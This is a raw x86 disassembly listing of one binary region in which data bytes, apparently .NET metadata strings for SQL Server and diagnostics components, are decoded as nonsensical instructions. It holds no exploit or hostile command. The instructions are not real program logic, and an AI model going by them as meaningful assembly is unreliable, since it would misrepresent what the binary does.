  407703:	add    BYTE PTR [edx],cl
  407705:	add    BYTE PTR [edi],cl
  407707:	add    BYTE PTR [edx],cl
  407709:	add    BYTE PTR [eax],dl
  40770b:	add    BYTE PTR [edx],cl
  40770d:	add    BYTE PTR [ecx],dl
  40770f:	add    BYTE PTR [edx],cl
  407711:	add    BYTE PTR [edx],dl
  407713:	add    BYTE PTR [edx],cl
  407715:	add    BYTE PTR [ebx],dl
  407717:	add    BYTE PTR [edx],cl
  407719:	add    BYTE PTR [eax],al
  40771b:	add    BYTE PTR [eax],al
  40771d:	add    BYTE PTR [edx],dl
  40771f:	add    BYTE PTR [esi+0x1],ch
  407722:	add    BYTE PTR [eax],al
  407724:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  40772b:	gs add BYTE PTR ds:[ebx+0x73],dh
  407730:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  407734:	outs   dx,BYTE PTR ds:[si]
  407736:	outs   dx,DWORD PTR ds:[esi]
  407737:	jae    0x40779e
  407739:	cs gs js 0x4077a2
  40773d:	add    BYTE PTR [ecx+0x73],al
  407740:	jae    0x4077a7
  407742:	ins    DWORD PTR es:[edi],dx
  407743:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  407747:	gs jb  0x4077bd
  40774a:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  407751:	add    BYTE PTR [ebx+0x73],dl
  407754:	bound  eax,QWORD PTR [ecx+ebp*2+0x61]
  407758:	addr16 dec ebp
  40775a:	popa   
  40775b:	imul   ebp,DWORD PTR [esi+0x0],0x44627353
  407762:	imul   esp,DWORD PTR [ecx+0x67],0x65736f6e
  407769:	add    BYTE PTR [ecx+eiz*2+0x67],dl
  40776d:	jae    0x40776f
  40776f:	inc    ebx
  407770:	outs   dx,DWORD PTR ds:[esi]
  407771:	outs   dx,BYTE PTR ds:[esi]
  407772:	imul   sp,WORD PTR [edi+0x75],0x6172
  407778:	je     0x4077e3
  40777a:	outs   dx,DWORD PTR ds:[esi]
  40777b:	outs   dx,BYTE PTR ds:[esi]
  40777c:	dec    edi
  40777d:	jo     0x4077f3
  40777f:	imul   ebp,DWORD PTR [edi+0x6e],0x73530073
  407786:	bound  eax,QWORD PTR [ecx+ebp*2+0x61]
  40778a:	outs   dx,BYTE PTR ds:[si]
  40778c:	outs   dx,DWORD PTR ds:[esi]
  40778d:	jae    0x4077f4
  40778f:	cs inc ebx
  407791:	outs   dx,DWORD PTR ds:[esi]
  407792:	ins    DWORD PTR es:[edi],dx
  407793:	ins    DWORD PTR es:[edi],dx
  407794:	popa   
  407795:	outs   dx,BYTE PTR ds:[esi]
  407796:	fs ins BYTE PTR es:[edi],dx
  407798:	imul   ebp,DWORD PTR [esi+0x65],0x6e6f4300
  40779f:	outs   dx,BYTE PTR ds:[esi]
  4077a0:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4077a5:	outs   dx,BYTE PTR ds:[esi]
  4077a6:	dec    edi
  4077a7:	jo     0x40781d
  4077a9:	imul   ebp,DWORD PTR [edi+0x6e],0x69440073
  4077b0:	popa   
  4077b1:	ins    BYTE PTR es:[edi],dx
  4077b2:	outs   dx,DWORD PTR ds:[esi]
  4077b3:	addr16 push ebx
  4077b5:	arpl   WORD PTR gs:[ebp+0x72],si
  4077b9:	imul   esi,DWORD PTR [ecx+edi*2+0x4f],0x6f697470
  4077c1:	outs   dx,BYTE PTR ds:[esi]
  4077c2:	jae    0x4077c4
  4077c4:	inc    edi
  4077c5:	outs   dx,BYTE PTR gs:[esi]
  4077c7:	gs jb  0x40782b
  4077ca:	ins    BYTE PTR es:[edi],dx
  4077cb:	dec    edi
  4077cc:	jo     0x407842
  4077ce:	imul   ebp,DWORD PTR [edi+0x6e],0x704f0073
  4077d5:	je     0x407840
  4077d7:	outs   dx,DWORD PTR ds:[esi]
  4077d8:	outs   dx,BYTE PTR ds:[esi]
  4077d9:	pusha  
  4077da:	xor    DWORD PTR [eax],eax
  4077dc:	push   eax
  4077dd:	popa   
  4077de:	jb     0x407853
  4077e0:	gs jb  0x4077e3
  4077e3:	push   eax
  4077e4:	popa   
  4077e5:	jb     0x40785a
  4077e7:	gs push ebx
  4077e9:	je     0x40784c
  4077eb:	je     0x407852
  4077ed:	add    BYTE PTR [edi+0x65],al
  4077f0:	outs   dx,BYTE PTR ds:[esi]
  4077f1:	gs jb  0x407855
  4077f4:	ins    BYTE PTR es:[edi],dx
  4077f5:	push   eax
  4077f6:	popa   
  4077f7:	jb     0x40786c
  4077f9:	gs push ebx
  4077fb:	je     0x40785e
  4077fd:	je     0x407864
  4077ff:	add    BYTE PTR [ebx+0x6f],al
  407802:	outs   dx,BYTE PTR ds:[esi]
  407803:	outs   dx,BYTE PTR ds:[esi]
  407804:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407809:	outs   dx,BYTE PTR ds:[esi]
  40780a:	push   eax
  40780b:	popa   
  40780c:	jb     0x407881
  40780e:	gs push ebx
  407810:	je     0x407873
  407812:	je     0x407879
  407814:	add    BYTE PTR [ebx+0x6f],al
  407817:	outs   dx,BYTE PTR ds:[esi]
  407818:	imul   sp,WORD PTR [edi+0x75],0x6172
  40781e:	je     0x407889
  407820:	outs   dx,DWORD PTR ds:[esi]
  407821:	outs   dx,BYTE PTR ds:[esi]
  407822:	push   eax
  407823:	popa   
  407824:	jb     0x407899
  407826:	gs push ebx
  407828:	je     0x40788b
  40782a:	je     0x407891
  40782c:	add    BYTE PTR [edx+0x75],dl
  40782f:	outs   dx,BYTE PTR ds:[esi]
  407830:	je     0x40789b
  407832:	ins    DWORD PTR es:[edi],dx
  407833:	gs push eax
  407835:	popa   
  407836:	jb     0x4078ab
  407838:	gs push ebx
  40783a:	je     0x40789d
  40783c:	je     0x4078a3
  40783e:	add    BYTE PTR [edi+ebp*2+0x6b],dl
  407842:	outs   dx,BYTE PTR gs:[esi]
  407844:	jae    0x407846
  407846:	push   eax
  407847:	popa   
  407848:	imul   esi,DWORD PTR [edx+0x0],0x74634145
  40784f:	imul   ebp,DWORD PTR [edi+0x6e],0x6e755200
  407856:	je     0x4078c1
  407858:	ins    DWORD PTR es:[edi],dx
  407859:	gs dec edi
  40785b:	jo     0x4078d1
  40785d:	imul   ebp,DWORD PTR [edi+0x6e],0x65530073
  407864:	jb     0x4078dc
  407866:	imul   esp,DWORD PTR [ebx+0x65],0x6974704f
  40786d:	outs   dx,DWORD PTR ds:[esi]
  40786e:	outs   dx,BYTE PTR ds:[esi]
  40786f:	jae    0x407871
  407871:	dec    esp
  407872:	outs   dx,DWORD PTR ds:[esi]
  407873:	arpl   WORD PTR [ecx+0x6c],sp
  407876:	imul   edi,DWORD PTR [edx+0x65],0x736d0064
  40787d:	arpl   WORD PTR [edi+0x72],bp
  407880:	ins    BYTE PTR es:[edi],dx
  407881:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  407888:	gs ins DWORD PTR es:[edi],dx
  40788a:	add    BYTE PTR [edi+0x62],cl
  40788d:	push   0x65
  40788f:	arpl   WORD PTR [eax+eax*1+0x54],si
  407893:	push   esi
  407894:	popa   
  407895:	ins    BYTE PTR es:[edi],dx
  407896:	jne    0x4078fd
  407898:	add    BYTE PTR [ebp+0x6e],al
  40789b:	jne    0x40790a
  40789d:	add    BYTE PTR [esi+0x61],dl
  4078a0:	ins    BYTE PTR es:[edi],dx
  4078a1:	jne    0x407908
  4078a3:	push   esp
  4078a4:	jns    0x407916
  4078a6:	add    BYTE PTR gs:[esi+0x65],dl
  4078aa:	jb     0x40791f
  4078ac:	imul   ebp,DWORD PTR [edi+0x6e],0x69727453
  4078b3:	outs   dx,BYTE PTR ds:[esi]
  4078b4:	add    BYTE PTR [di+0x61],cl
  4078b8:	push   0x6f
  4078ba:	jb     0x407912
  4078bc:	gs jb  0x407932
  4078bf:	imul   ebp,DWORD PTR [edi+0x6e],0x6e694d00
  4078c6:	outs   dx,DWORD PTR ds:[esi]
  4078c7:	jb     0x40791f
  4078c9:	gs jb  0x40793f
  4078cc:	imul   ebp,DWORD PTR [edi+0x6e],0x69754200
  4078d3:	ins    BYTE PTR es:[edi],dx
  4078d4:	fs push esi
  4078d6:	gs jb  0x40794c
  4078d9:	imul   ebp,DWORD PTR [edi+0x6e],0x4c505300
  4078e0:	gs jbe 0x407948
  4078e3:	ins    BYTE PTR es:[edi],dx
  4078e4:	add    BYTE PTR [eax+0x72],dl
  4078e7:	outs   dx,DWORD PTR ds:[esi]
  4078e8:	fs jne 0x40794e
  4078eb:	je     0x407943
  4078ed:	gs jb  0x407963
  4078f0:	imul   ebp,DWORD PTR [edi+0x6e],0x69727453
  4078f7:	outs   dx,BYTE PTR ds:[esi]
  4078f8:	add    BYTE PTR [bx+si+0x72],dl
  4078fc:	outs   dx,DWORD PTR ds:[esi]
  4078fd:	fs jne 0x407963
  407900:	je     0x407950
  407902:	popa   
  407903:	ins    DWORD PTR es:[edi],dx
  407904:	gs push ebx
  407906:	je     0x40797a
  407908:	imul   ebp,DWORD PTR [esi+0x67],0x6c715300
  40790f:	inc    ebp
  407910:	outs   dx,BYTE PTR ds:[esi]
  407911:	imul   ebp,DWORD PTR [bp+0x65],0x67617355
  407919:	gs dec ebp
  40791b:	gs je  0x407990
  40791e:	imul   esp,DWORD PTR [ebx+0x73],0x656c6f52
  407925:	inc    edi
  407926:	jne    0x407991
  407928:	fs push ebx
  40792a:	je     0x40799e
  40792c:	imul   ebp,DWORD PTR [esi+0x67],0x6f725000
  407933:	fs jne 0x407999
  407936:	je     0x407986
  407938:	popa   
  407939:	ins    DWORD PTR es:[edi],dx
  40793a:	gs inc edx
  40793c:	jb     0x40799f
  40793e:	outs   dx,BYTE PTR ds:[esi]
  40793f:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  407947:	outs   dx,BYTE PTR ds:[esi]
  407948:	add    BYTE PTR [si+0x6f],cl
  40794c:	outs   dx,BYTE PTR ds:[esi]
  40794d:	addr16 push eax
  40794f:	jb     0x4079c0
  407951:	fs jne 0x4079b7
  407954:	je     0x4079a4
  407956:	popa   
  407957:	ins    DWORD PTR es:[edi],dx
  407958:	gs inc edx
  40795a:	jb     0x4079bd
  40795c:	outs   dx,BYTE PTR ds:[esi]
  40795d:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  407965:	outs   dx,BYTE PTR ds:[esi]
  407966:	add    BYTE PTR [bx+si+0x72],dl
  40796a:	outs   dx,DWORD PTR ds:[esi]
  40796b:	fs jne 0x4079d1
  40796e:	je     0x4079be
  407970:	popa   
  407971:	ins    DWORD PTR es:[edi],dx
  407972:	gs push ebx
  407974:	push   0x6374726f
  407979:	jne    0x4079ef
  40797b:	inc    edx
  40797c:	jb     0x4079df
  40797e:	outs   dx,BYTE PTR ds:[esi]
  40797f:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  407987:	outs   dx,BYTE PTR ds:[esi]
  407988:	add    BYTE PTR [bp+0x65],dl
  40798c:	jb     0x407a01
  40798e:	imul   ebp,DWORD PTR [edi+0x6e],0x61636f4c
  407995:	je     0x407a00
  407997:	outs   dx,DWORD PTR ds:[esi]
  407998:	outs   dx,BYTE PTR ds:[esi]
  407999:	push   ebx
  40799a:	je     0x407a0e
  40799c:	imul   ebp,DWORD PTR [esi+0x67],0x6f725000
  4079a3:	fs jne 0x407a09
  4079a6:	je     0x4079fe
  4079a8:	gs jb  0x407a1e
  4079ab:	imul   ebp,DWORD PTR [edi+0x6e],0x61636f4c
  4079b2:	je     0x407a1d
  4079b4:	outs   dx,DWORD PTR ds:[esi]
  4079b5:	outs   dx,BYTE PTR ds:[esi]
  4079b6:	push   ebx
  4079b7:	je     0x407a2b
  4079b9:	imul   ebp,DWORD PTR [esi+0x67],0x72655600
  4079c0:	jae    0x407a2b
  4079c2:	outs   dx,DWORD PTR ds:[esi]
  4079c3:	outs   dx,BYTE PTR ds:[esi]
  4079c4:	dec    eax
  4079c5:	gs ins BYTE PTR es:[edi],dx
  4079c7:	jo     0x407a14
  4079c9:	gs jns 0x407a43
  4079cc:	outs   dx,DWORD PTR ds:[esi]
  4079cd:	jb     0x407a33
  4079cf:	push   eax
  4079d0:	jb     0x407a37
  4079d2:	imul   di,WORD PTR [eax+0x0],0x6556
  4079d8:	jb     0x407a4d
  4079da:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  4079e1:	push   ebx
  4079e2:	gs je  0x407a59
  4079e5:	imul   ebp,DWORD PTR [esi+0x67],0x6b6f5473
  4079ec:	outs   dx,BYTE PTR gs:[esi]
  4079ee:	add    BYTE PTR [ebx+0x65],dl
  4079f1:	je     0x407a68
  4079f3:	jo     0x407a48
  4079f5:	jne    0x407a67
  4079f7:	jo     0x407a68
  4079f9:	jb     0x407a6f
  4079fb:	inc    esi
  4079fc:	outs   dx,DWORD PTR ds:[esi]
  4079fd:	ins    BYTE PTR es:[edi],dx
  4079fe:	fs gs jb 0x407a02
  407a02:	push   eax
  407a03:	jb     0x407a74
  407a05:	fs jne 0x407a6b
  407a08:	je     0x407a56
  407a0a:	imul   esp,DWORD PTR [ebx+0x65],0x4665736e
  407a11:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x646f7250
  407a19:	jne    0x407a7e
  407a1b:	je     0x407a72
  407a1d:	jo     0x407a83
  407a1f:	popa   
  407a20:	je     0x407a87
  407a22:	inc    ebx
  407a23:	popa   
  407a24:	je     0x407a8b
  407a26:	outs   dx,DWORD PTR ds:[si]
  407a28:	jb     0x407aa3
  407a2a:	add    BYTE PTR [ebx+0x71],dl
  407a2d:	ins    BYTE PTR es:[edi],dx
  407a2e:	push   eax
  407a2f:	jb     0x407aa0
  407a31:	fs jne 0x407a97
  407a34:	je     0x407a7c
  407a36:	popa   
  407a37:	ins    DWORD PTR es:[edi],dx
  407a38:	imul   ebp,DWORD PTR [ecx+edi*2+0x43],0x65646f
  407a40:	push   eax
  407a41:	jb     0x407ab2
  407a43:	fs jne 0x407aa9
  407a46:	je     0x407a8c
  407a48:	imul   esi,DWORD PTR [ebx+0x63],0x7265766f
  407a4f:	jns    0x407a9a
  407a51:	add    BYTE PTR fs:[ebx+0x71],dl
  407a55:	ins    BYTE PTR es:[edi],dx
  407a56:	dec    ecx
  407a57:	outs   dx,BYTE PTR ds:[esi]
  407a58:	jae    0x407ace
  407a5a:	popa   
  407a5b:	outs   dx,BYTE PTR ds:[esi]
  407a5c:	arpl   WORD PTR [ebp+0x49],sp
  407a5f:	inc    esp
  407a60:	push   eax
  407a61:	jb     0x407ac8
  407a63:	imul   di,WORD PTR [eax+0x0],0x7341
  407a69:	dec    ecx
  407a6a:	outs   dx,BYTE PTR ds:[esi]
  407a6b:	jae    0x407ae1
  407a6d:	popa   
  407a6e:	outs   dx,BYTE PTR ds:[esi]
  407a6f:	arpl   WORD PTR [ebp+0x49],sp
  407a72:	inc    esp
  407a73:	push   eax
  407a74:	jb     0x407adb
  407a76:	imul   di,WORD PTR [eax+0x0],0x7352
  407a7c:	dec    ecx
  407a7d:	outs   dx,BYTE PTR ds:[esi]
  407a7e:	jae    0x407af4
  407a80:	popa   
  407a81:	outs   dx,BYTE PTR ds:[esi]
  407a82:	arpl   WORD PTR [ebp+0x49],sp
  407a85:	inc    esp
  407a86:	push   eax
  407a87:	jb     0x407aee
  407a89:	imul   di,WORD PTR [eax+0x0],0x614d
  407a8f:	js     0x407ade
  407a91:	popa   
  407a92:	imul   ebp,DWORD PTR [esi+0x74],0x6e616e65
  407a99:	arpl   WORD PTR [ebp+0x56],sp
  407a9c:	gs jb  0x407b12
  407a9f:	imul   ebp,DWORD PTR [edi+0x6e],0x61766500
  407aa6:	ins    BYTE PTR es:[edi],dx
  407aa7:	push   esp
  407aa8:	imul   ebp,DWORD PTR [ebp+0x65],0x626d6f42
  407aaf:	push   esi
  407ab0:	popa   
  407ab1:	ins    BYTE PTR es:[edi],dx
  407ab2:	jne    0x407b19
  407ab4:	add    BYTE PTR [ebx+0x75],ah
  407ab7:	jb     0x407b2b
  407ab9:	outs   dx,BYTE PTR gs:[esi]
  407abb:	je     0x407b0f
  407abd:	gs ins BYTE PTR es:[edi],dx
  407abf:	gs popa 
  407ac1:	jae    0x407b28
  407ac3:	push   esp
  407ac4:	imul   ebp,DWORD PTR [ebp+0x65],0x626d6f42
  407acb:	push   esi
  407acc:	popa   
  407acd:	ins    BYTE PTR es:[edi],dx
  407ace:	jne    0x407b35
  407ad0:	add    BYTE PTR [edi+0x65],dl
  407ad3:	jb     0x407b1a
  407ad5:	jbe    0x407b3c
  407ad7:	outs   dx,BYTE PTR ds:[esi]
  407ad8:	je     0x407b28
  407ada:	popa   
  407adb:	ins    DWORD PTR es:[edi],dx
  407adc:	gs push ebx
  407ade:	gs je  0x407b56
  407ae1:	jo     0x407b30
  407ae3:	jae    0x407b4e
  407ae5:	add    BYTE PTR [edi+0x65],dl
  407ae8:	jb     0x407b2f
  407aea:	jbe    0x407b51
  407aec:	outs   dx,BYTE PTR ds:[esi]
  407aed:	je     0x407b3d
  407aef:	popa   
  407af0:	ins    DWORD PTR es:[edi],dx
  407af1:	gs push ebx
  407af3:	gs je  0x407b6b
  407af6:	jo     0x407b3b
  407af8:	outs   dx,DWORD PTR ds:[esi]
  407af9:	outs   dx,BYTE PTR ds:[esi]
  407afa:	imul   sp,WORD PTR [edi+0x0],0x5341
  407b00:	push   ebp
  407b01:	jae    0x407b64
  407b03:	addr16 gs dec ebp
  407b06:	gs je  0x407b7b
  407b09:	imul   esp,DWORD PTR [ebx+0x73],0x656c6f52
  407b10:	inc    edi
  407b11:	jne    0x407b7c
  407b13:	fs push ebx
  407b15:	je     0x407b89
  407b17:	imul   ebp,DWORD PTR [esi+0x67],0x72655600
  407b1e:	jae    0x407b89
  407b20:	outs   dx,DWORD PTR ds:[esi]
  407b21:	outs   dx,BYTE PTR ds:[esi]
  407b22:	inc    edx
  407b23:	dec    ecx
  407b24:	inc    esp
  407b25:	push   ebx
  407b26:	dec    eax
  407b27:	gs ins BYTE PTR es:[edi],dx
  407b29:	jo     0x407b79
  407b2b:	popa   
  407b2c:	ins    DWORD PTR es:[edi],dx
  407b2d:	gs jae 0x407ba0
  407b30:	popa   
  407b31:	arpl   WORD PTR [ebp+0x0],sp
  407b34:	push   esi
  407b35:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  407b3c:	jne    0x407ba2
  407b3e:	imul   ebp,DWORD PTR [edi+0x53],0x6c6c6568
  407b45:	push   esi
  407b46:	gs jb  0x407bbc
  407b49:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  407b50:	pop    edi
  407b51:	push   esi
  407b52:	gs jb  0x407bc8
  407b55:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  407b5c:	dec    esi
  407b5d:	popa   
  407b5e:	ins    DWORD PTR es:[edi],dx
  407b5f:	gs jae 0x407bd2
  407b62:	popa   
  407b63:	arpl   WORD PTR [ebp+0x0],sp
  407b66:	push   esi
  407b67:	gs jb  0x407bdd
  407b6a:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  407b71:	dec    esi
  407b72:	popa   
  407b73:	ins    DWORD PTR es:[edi],dx
  407b74:	gs jae 0x407be7
  407b77:	popa   
  407b78:	arpl   WORD PTR [ebp+0x0],sp
  407b7b:	push   ebx
  407b7c:	jns    0x407bf1
  407b7e:	je     0x407be5
  407b80:	ins    DWORD PTR es:[edi],dx
  407b81:	cs pop eax
  407b83:	ins    DWORD PTR es:[edi],dx
  407b84:	ins    BYTE PTR es:[edi],dx
  407b85:	add    BYTE PTR [eax+0x6d],bl
  407b88:	ins    BYTE PTR es:[edi],dx
  407b89:	push   edi
  407b8a:	jb     0x407bf5
  407b8c:	je     0x407bf3
  407b8e:	jb     0x407b90
  407b90:	pop    edi
  407b91:	js     0x407c00
  407b93:	ins    BYTE PTR es:[edi],dx
  407b94:	push   edi
  407b95:	jb     0x407c00
  407b97:	je     0x407bfe
  407b99:	jb     0x407b9b
  407b9b:	pop    edi
  407b9c:	jo     0x407bff
  407b9e:	jb     0x407c13
  407ba0:	gs jb  0x407ba3
  407ba3:	dec    ebp
  407ba4:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  407bab:	je     0x407bdb
  407bad:	push   ebx
  407bae:	jno    0x407c1c
  407bb0:	push   ebx
  407bb1:	gs jb  0x407c2a
  407bb4:	gs jb  0x407be5
  407bb7:	push   ebx
  407bb8:	gs jb  0x407c31
  407bbb:	imul   esp,DWORD PTR [ebx+0x65],0x6b6f7242
  407bc2:	gs jb  0x407bf3
  407bc5:	inc    esp
  407bc6:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  407bcd:	imul   esp,DWORD PTR [ebx+0x73],0x61696400
  407bd4:	outs   dx,BYTE PTR ds:[si]
  407bd6:	outs   dx,DWORD PTR ds:[esi]
  407bd7:	jae    0x407c4d
  407bd9:	imul   esp,DWORD PTR [ebx+0x73],0x61694400
  407be0:	outs   dx,BYTE PTR ds:[si]
  407be2:	outs   dx,DWORD PTR ds:[esi]
  407be3:	jae    0x407c59
  407be5:	imul   esp,DWORD PTR [ebx+0x73],0x6e657645
  407bec:	je     0x407c3a
  407bee:	gs jbe 0x407c56
  407bf1:	ins    BYTE PTR es:[edi],dx
  407bf2:	add    BYTE PTR [edi+0x6d],bl
  407bf5:	imul   ebp,DWORD PTR [esi+0x4c],0x6c657665
  407bfc:	add    BYTE PTR [edi+0x65],bl
  407bff:	jb     0x407c73
  407c01:	outs   dx,DWORD PTR ds:[esi]
  407c02:	jb     0x407c77
  407c04:	add    BYTE PTR [edi+0x77],bl
  407c07:	popa   
  407c08:	jb     0x407c78
  407c0a:	imul   ebp,DWORD PTR [esi+0x67],0x695f0073
  407c11:	outs   dx,BYTE PTR ds:[esi]
  407c12:	outs   dx,WORD PTR ds:[esi]
  407c14:	jae    0x407c16
  407c16:	pop    edi
  407c17:	jae    0x407c8e
  407c19:	jo     0x407c8b
  407c1b:	jb     0x407c82
  407c1d:	jae    0x407c92
  407c1f:	gs add BYTE PTR fs:[ebp+0x61],cl
  407c24:	imul   ebp,DWORD PTR [esi+0x0],0x67616944
  407c2b:	outs   dx,BYTE PTR ds:[esi]
  407c2c:	outs   dx,DWORD PTR ds:[esi]
  407c2d:	jae    0x407ca3
  407c2f:	imul   esp,DWORD PTR [ebx+0x73],0x69676e45
  407c36:	outs   dx,BYTE PTR ds:[esi]
  407c37:	add    BYTE PTR gs:[ebx+0x68],al
  407c3b:	arpl   WORD PTR gs:[ebx+0x52],bp
  407c3f:	jne    0x407caf
  407c41:	je     0x407cac
  407c43:	ins    DWORD PTR es:[edi],dx
  407c44:	add    BYTE PTR gs:[ebx+0x68],al
  407c48:	arpl   WORD PTR gs:[ebx+0x43],bp
  407c4c:	outs   dx,DWORD PTR ds:[esi]
  407c4d:	outs   dx,BYTE PTR ds:[esi]
  407c4e:	imul   sp,WORD PTR [edi+0x75],0x6172
  407c54:	je     0x407cbf
  407c56:	outs   dx,DWORD PTR ds:[esi]
  407c57:	outs   dx,BYTE PTR ds:[esi]
  407c58:	add    BYTE PTR [ebx+0x6f],al
  407c5b:	outs   dx,BYTE PTR ds:[esi]
  407c5c:	outs   dx,BYTE PTR ds:[esi]
  407c5d:	arpl   WORD PTR gs:[esp+edx*2+0x6f],si
  407c62:	push   ebx
  407c63:	gs jb  0x407cdc
  407c66:	gs jb  0x407c69
  407c69:	inc    esp
  407c6a:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  407c71:	imul   esp,DWORD PTR [ebx+0x73],0x6e657645
  407c78:	je     0x407cbb
  407c7a:	jb     0x407ce3
  407c7c:	jae    0x407c7e
  407c7e:	inc    ebx
  407c7f:	outs   dx,DWORD PTR ds:[esi]
  407c80:	jne    0x407cf0
  407c82:	je     0x407cc9
  407c84:	jbe    0x407ceb
  407c86:	outs   dx,BYTE PTR ds:[esi]
  407c87:	je     0x407cfc
  407c89:	add    BYTE PTR [ebp+0x6e],al
  407c8c:	imul   ebp,DWORD PTR [bp+0x65],0x65637845
  407c94:	jo     0x407d0a
  407c96:	imul   ebp,DWORD PTR [edi+0x6e],0x6e657645
  407c9d:	je     0x407ce0
  407c9f:	jb     0x407d08
  407ca1:	jae    0x407ca3
  407ca3:	outs   dx,BYTE PTR gs:[esi]
  407ca5:	imul   ebp,DWORD PTR [bp+0x65],0x456e4f5f
  407cad:	outs   dx,BYTE PTR ds:[esi]
  407cae:	imul   ebp,DWORD PTR [bp+0x65],0x65637845
  407cb6:	jo     0x407d2c
  407cb8:	imul   ebp,DWORD PTR [edi+0x6e],0x676e6500
  407cbf:	imul   ebp,DWORD PTR [esi+0x65],0x446e4f5f
  407cc6:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  407ccd:	imul   esp,DWORD PTR [ebx+0x73],0x6e657645
  407cd4:	je     0x407cd6
  407cd6:	outs   dx,BYTE PTR gs:[esi]
  407cd8:	imul   ebp,DWORD PTR [bp+0x65],0x446e4f5f
  407ce0:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  407ce7:	imul   esp,DWORD PTR [ebx+0x73],0x6e657645
  407cee:	je     0x407d48
  407cf0:	dec    ebp
  407cf1:	dec    esp
  407cf2:	add    BYTE PTR [edi+0x65],ah
  407cf5:	je     0x407d56
  407cf7:	inc    ecx
  407cf8:	jae    0x407d6d
  407cfa:	gs ins DWORD PTR es:[edi],dx
  407cfc:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  407d00:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x74656700
  407d08:	pop    edi
  407d09:	inc    ecx
  407d0a:	jae    0x407d7f
  407d0c:	gs ins DWORD PTR es:[edi],dx
  407d0e:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  407d12:	gs jb  0x407d88
  407d15:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  407d1c:	pop    edi
  407d1d:	inc    ecx
  407d1e:	jae    0x407d93
  407d20:	gs ins DWORD PTR es:[edi],dx
  407d22:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  407d26:	jb     0x407d97
  407d28:	fs jne 0x407d8e
  407d2b:	je     0x407d2d
  407d2d:	arpl   WORD PTR cs:[edi+ebp*2+0x72],si
  407d32:	add    BYTE PTR [ecx+0x73],al
  407d35:	jae    0x407d9c
  407d37:	ins    DWORD PTR es:[edi],dx
  407d38:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  407d3c:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x73734100
  407d44:	gs ins DWORD PTR es:[edi],dx
  407d46:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  407d4a:	gs jb  0x407dc0
  407d4d:	imul   ebp,DWORD PTR [edi+0x6e],0x73734100
  407d54:	gs ins DWORD PTR es:[edi],dx
  407d56:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  407d5a:	jb     0x407dcb
  407d5c:	fs jne 0x407dc2
  407d5f:	je     0x407d61
  407d61:	inc    esp
  407d62:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  407d69:	imul   esp,DWORD PTR [ebx+0x73],0x6e614200
  407d70:	outs   dx,BYTE PTR ds:[esi]
  407d71:	gs jb  0x407d74
  407d74:	push   eax
  407d75:	jb     0x407de6
  407d77:	fs jne 0x407ddd
  407d7a:	je     0x407d7c
  407d7c:	push   esp
  407d7d:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72655600
  407d85:	jae    0x407df0
  407d87:	outs   dx,DWORD PTR ds:[esi]
  407d88:	outs   dx,BYTE PTR ds:[esi]
  407d89:	add    BYTE PTR [ecx+ebp*2+0x61],al
  407d8d:	outs   dx,BYTE PTR ds:[si]
  407d8f:	outs   dx,DWORD PTR ds:[esi]
  407d90:	jae    0x407e06
  407d92:	imul   esp,DWORD PTR [ebx+0x0],0x65646f43
  407d99:	add    BYTE PTR [ebp+eiz*2+0x76],cl
  407d9d:	gs ins BYTE PTR es:[edi],dx
  407d9f:	add    BYTE PTR [ecx+edi*2+0x70],dl
  407da3:	add    BYTE PTR gs:[ebx+0x65],dl
  407da7:	jbe    0x407e0e
  407da9:	jb     0x407e14
  407dab:	je     0x407e26
  407dad:	add    BYTE PTR [ebx+0x65],dl
  407db0:	jb     0x407e28
  407db2:	gs jb  0x407db5
  407db5:	inc    esp
  407db6:	popa   
  407db7:	je     0x407e1a
  407db9:	bound  esp,QWORD PTR [ecx+0x73]
  407dbc:	add    BYTE PTR gs:[ebp+0x72],al
  407dc0:	jb     0x407e31
  407dc2:	jb     0x407dc4
  407dc4:	push   edi
  407dc5:	popa   
  407dc6:	jb     0x407e36
  407dc8:	imul   ebp,DWORD PTR [esi+0x67],0x72665f00
  407dcf:	outs   dx,DWORD PTR ds:[esi]
  407dd0:	ins    DWORD PTR es:[edi],dx
  407dd1:	push   ebx
  407dd2:	gs jb  0x407e4b
  407dd5:	imul   esp,DWORD PTR [ebx+0x65],0x74656700
  407ddc:	pop    edi
  407ddd:	inc    esi
  407dde:	jb     0x407e4f
  407de0:	ins    DWORD PTR es:[edi],dx
  407de1:	push   ebx
  407de2:	gs jb  0x407e5b
  407de5:	imul   esp,DWORD PTR [ebx+0x65],0x6f745f00
  407dec:	push   ebx
  407ded:	gs jb  0x407e66
  407df0:	imul   esp,DWORD PTR [ebx+0x65],0x74656700
  407df7:	pop    edi
  407df8:	push   esp
  407df9:	outs   dx,DWORD PTR ds:[esi]
  407dfa:	push   ebx
  407dfb:	gs jb  0x407e74
  407dfe:	imul   esp,DWORD PTR [ebx+0x65],0x6f635f00
  407e05:	outs   dx,BYTE PTR ds:[esi]
  407e06:	je     0x407e7a
  407e08:	popa   
